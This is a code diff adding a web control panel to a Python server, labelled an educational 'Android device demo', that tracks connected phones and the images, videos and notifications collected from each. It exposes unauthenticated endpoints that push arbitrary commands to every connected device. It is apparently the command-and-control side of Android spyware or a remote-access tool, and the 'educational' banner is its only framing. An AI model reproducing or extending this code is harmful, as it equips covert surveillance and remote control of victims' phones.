@@ -818,3 +818,173 @@ class DemoServer:
 
 class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
     """Handle HTTP requests for the web GUI."""
+    
+    server_instance = None
+    
+    def log_message(self, format, *args):
+        pass
+    
+    def do_GET(self):
+        parsed = urllib.parse.urlparse(self.path)
+        path = parsed.path
+        query = urllib.parse.parse_qs(parsed.query)
+        
+        if path == '/' or path == '/index.html':
+            self.serve_file('index.html', 'text/html')
+        elif path == '/style.css':
+            self.serve_file('style.css', 'text/css')
+        elif path == '/script.js':
+            self.serve_file('script.js', 'application/javascript')
+        elif path == '/api/devices':
+            self.handle_get_devices()
+        elif path == '/api/logs':
+            self.handle_get_logs()
+        elif path == '/api/stats':
+            self.handle_get_stats()
+        elif path == '/api/command':
+            self.handle_get_command(query)
+        else:
+            self.send_error(404, "Not Found")
+    
+    def do_POST(self):
+        parsed = urllib.parse.urlparse(self.path)
+        path = parsed.path
+        
+        if path == '/api/command':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data.decode('utf-8'))
+                self.handle_post_command(data)
+            except:
+                self.send_error(400, "Bad Request")
+        else:
+            self.send_error(404, "Not Found")
+    
+    def serve_file(self, filename, content_type):
+        try:
+            with open(filename, 'rb') as f:
+                content = f.read()
+            self.send_response(200)
+            self.send_header('Content-Type', content_type)
+            self.send_header('Content-Length', str(len(content)))
+            self.end_headers()
+            self.wfile.write(content)
+        except FileNotFoundError:
+            self.send_error(404, "File Not Found")
+        except Exception as e:
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_get_devices(self):
+        if not self.server_instance:
+            self.send_error(500, "Server not available")
+            return
+        with self.server_instance.lock:
+            devices = []
+            for sid, session in self.server_instance.sessions.items():
+                devices.append({
+                    'id': sid,
+                    'ip': session.address[0],
+                    'model': session.device_info.get('model', 'Unknown'),
+                    'status': 'ONLINE' if session.connected else 'OFFLINE',
+                    'images': session.total_images_received,
+                    'videos': session.total_videos_received,
+                    'notifications': session.total_notifications_received
+                })
+        self.send_json_response(devices)
+    
+    def handle_get_logs(self):
+        if not self.server_instance:
+            self.send_error(500, "Server not available")
+            return
+        logs = getattr(self.server_instance, 'recent_logs', [])
+        self.send_json_response({'logs': logs})
+    
+    def handle_get_stats(self):
+        if not self.server_instance:
+            self.send_error(500, "Server not available")
+            return
+        self.server_instance.update_stats()
+        self.send_json_response(self.server_instance.stats)
+    
+    def handle_get_command(self, query):
+        if not self.server_instance:
+            self.send_error(500, "Server not available")
+            return
+        command = query.get('command', [''])[0]
+        args = query.get('args', ['{}'])[0]
+        self.server_instance.send_command_to_all(command, args)
+        self.send_json_response({'status': 'sent', 'command': command})
+    
+    def handle_post_command(self, data):
+        if not self.server_instance:
+            self.send_error(500, "Server not available")
+            return
+        command = data.get('command', '')
+        args = data.get('args', '{}')
+        if isinstance(args, dict):
+            args = json.dumps(args)
+        self.server_instance.send_command_to_all(command, args)
+        self.send_json_response({'status': 'sent', 'command': command})
+    
+    def send_json_response(self, data):
+        response = json.dumps(data)
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.send_header('Content-Length', str(len(response)))
+        self.end_headers()
+        self.wfile.write(response.encode('utf-8'))
+
+
+class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    daemon_threads = True
+    allow_reuse_address = True
+
+
+def main():
+    SOCKET_HOST = '0.0.0.0'
+    SOCKET_PORT = 8000
+    HTTP_HOST = '0.0.0.0'
+    HTTP_PORT = 8080
+    
+    log_queue = queue.Queue()
+    
+    socket_server = DemoServer(
+        host=SOCKET_HOST,
+        port=SOCKET_PORT,
+        log_queue=log_queue,
+        console_mode=False
+    )
+    
+    ThreadedHTTPRequestHandler.server_instance = socket_server
+    
+    http_server = ThreadedHTTPServer((HTTP_HOST, HTTP_PORT), ThreadedHTTPRequestHandler)
+    
+    socket_thread = threading.Thread(target=socket_server.start, daemon=True)
+    socket_thread.start()
+    
+    http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
+    http_thread.start()
+    
+    print("=" * 60)
+    print("  ANDROID DEVICE DEMO SERVER - VERSION 5.1 WITH WEB GUI")
+    print("  Educational Purpose Only")
+    print("=" * 60)
+    print(f"[+] Socket server listening on {SOCKET_HOST}:{SOCKET_PORT}")
+    print(f"[+] HTTP server listening on {HTTP_HOST}:{HTTP_PORT}")
+    print(f"[+] Open http://<server-ip>:{HTTP_PORT} in a browser to access the GUI")
+    print("=" * 60)
+    
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[!] Shutting down servers...")
+        socket_server.running = False
+        http_server.shutdown()
+        time.sleep(2)
+        print("[!] Servers stopped.")
+
+
+if __name__ == "__main__":
+    main()
